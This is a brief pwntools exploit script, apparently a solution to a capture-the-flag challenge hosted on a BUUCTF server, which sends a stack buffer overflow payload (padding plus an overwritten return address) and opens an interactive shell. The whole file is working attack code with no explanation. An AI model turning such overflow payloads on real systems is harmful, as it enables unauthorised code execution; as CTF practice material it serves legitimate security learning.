from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",25148)
sh.sendline('100')
payload=0x18*b'a'+p64(0x00000000004006EA)
sh.sendline(payload)
sh.interactive()
